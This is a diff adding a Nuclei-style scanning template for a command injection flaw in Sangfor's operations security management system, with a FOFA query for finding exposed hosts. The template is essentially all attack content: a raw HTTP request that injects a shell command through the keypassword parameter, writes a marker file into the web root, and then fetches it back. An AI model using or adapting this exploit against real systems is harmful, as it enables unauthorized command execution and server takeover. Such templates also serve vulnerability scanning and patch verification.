@@ -1,0 +1,31 @@
+id: sangfor-om-session-command-exec-1
+
+info:
+  name: 深信服运维安全管理系统 Session接口命令注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/fort/login"
+          影响版本：深信服运维安全管理系统（OSM）<3.0.12 20241106 该漏洞源于/protocol/session等接口的输入验证机制存在缺陷，攻击者可利用反引号（`）在参数中注入系统命令，从而实现任意命令执行，最终获取服务器完全控制权限。
+  tags: 深信服运维安全管理系统
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    GET /isomp-protocol/protocol/session?keyPath=/etc/passwd&protocol=ssh&keypassword=123456%27%3Becho%20NdayTest+%3E%20/usr/local/tomcat/webapps/fort/trust/NTest.txt;&sshd=1 HTTP/1.1
+    Host: {{Hostname}}
+- raw:
+  - |
+    GET /fort/trust/NTest.txt HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
